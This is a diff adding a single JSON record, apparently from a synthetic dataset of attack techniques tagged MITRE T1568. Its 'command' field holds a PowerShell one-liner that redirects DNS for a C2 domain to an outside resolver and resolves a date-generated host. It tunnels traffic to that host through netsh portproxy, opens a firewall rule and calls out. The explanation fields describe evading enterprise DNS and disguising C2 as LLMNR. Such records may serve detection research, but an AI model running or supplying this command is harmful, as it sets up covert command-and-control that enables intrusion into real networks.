@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Add-DnsClientNrptRule -Namespace '.c2mesh.net' -NameServers 9.9.9.9 -Comment 'svc';$d='edge'+(Get-Date -Format 'yyMMdd')+'.c2mesh.net';$a=Resolve-DnsName $d -Type A -ErrorAction SilentlyContinue;if($a){$ip=($a|Get-Random).IPAddress;netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=5355 connectaddress=$ip connectport=8443;netsh advfirewall firewall add rule name='c2_lmnr_5355' dir=in action=allow protocol=TCP localport=5355;Invoke-WebRequest -Uri 'http://127.0.0.1:5355/s' -UseBasicParsing -Headers @{NRPT='1';Dom=$d} -TimeoutSec 5}",
+  "explanation": "Forces DNS for a C2 namespace to an external resolver via NRPT, resolves the DGA host, then tunnels C2 over a local port mimicking LLMNR to a non-standard remote port.",
+  "rationale_steps": [
+    "Direct DNS queries for the target namespace to an external server to bypass enterprise resolvers.",
+    "Resolve and immediately map traffic through portproxy to the dynamic endpoint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-fa631d9d",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
